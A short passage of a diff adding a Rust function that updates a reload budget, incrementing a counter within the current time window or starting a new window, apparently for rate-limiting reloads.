+    /// `budget` after one more reload at `now`.
+    fn after_reload(budget: Option<&Self>, now: Instant) -> Self {
+        match budget {
+            Some(budget) if budget.current(now) => Self {
+                since: budget.since,
+                count: budget.count + 1,
+            },
+            _ => Self {
+                since: now,
+                count: 1,
+            },
+        }
+    }
